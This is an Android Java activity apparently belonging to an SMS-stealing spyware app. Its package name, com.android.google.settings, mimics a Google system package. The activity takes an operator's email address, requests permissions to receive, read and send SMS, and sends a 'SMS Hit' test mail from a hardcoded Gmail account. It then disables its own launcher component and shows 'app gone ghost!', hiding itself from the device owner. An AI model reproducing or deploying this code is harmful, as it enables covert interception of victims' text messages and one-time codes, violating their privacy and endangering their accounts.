package com.android.google.settings;

import android.Manifest;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;
import android.support.design.widget.Snackbar;
import android.support.design.widget.TextInputLayout;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Patterns;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.EditText;
import android.widget.Toast;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;
import com.theah64.safemail.SafeMail;

import java.util.List;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final TextInputLayout tilEmail = findViewById(R.id.til_email);

        findViewById(R.id.bIgnite).setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View view) {

                final EditText etEmail = tilEmail.getEditText();
                assert etEmail != null;
                final String email = etEmail.getText().toString().trim();

                if (Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
                    checkPermission(email);
                } else {
                    Snackbar.make(view, R.string.main_error_invalid_email, Snackbar.LENGTH_SHORT)
                            .show();
                }


            }
        });
    }

    private void checkPermission(final String email) {

        Dexter.withActivity(MainActivity.this)
                .withPermissions(
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.SEND_SMS,
                        Manifest.permission.READ_SMS

                )
                .withListener(new MultiplePermissionsListener() {
                    @Override
                    public void onPermissionsChecked(MultiplePermissionsReport report) {
                        if (report.areAllPermissionsGranted()) {


                            // Saving mail to pref
                            PrefHelper.getInstance(MainActivity.this).putString(
                                    PrefHelper.KEY_EMAIL, email
                            );

                            Toast.makeText(MainActivity.this, "Sending test mail...", Toast.LENGTH_SHORT).show();
                            sendTestMail(email);
                        }
                    }

                    @Override
                    public void onPermissionRationaleShouldBeShown(List<PermissionRequest> permissions, PermissionToken token) {

                    }
                })
                .check();
    }

    private void sendTestMail(String email) {
        SafeMail.sendMail(
                "mymailer64@gmail.com",
                email,
                "SMS Hit",
                "Test hit",
                new SafeMail.SafeMailCallback() {
                    @Override
                    public void onSuccess() {
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(MainActivity.this, "Sent, app gone ghost!", Toast.LENGTH_SHORT).show();

                                PackageManager p = getPackageManager();
                                ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
                                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);


                            }
                        });
                    }

                    @Override
                    public void onFailed(final Throwable throwable) {
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                Toast.makeText(MainActivity.this, "Not Sent! Due to " + throwable.getMessage(), Toast.LENGTH_SHORT).show();
                            }
                        });
                    }
                }
        );
    }
}
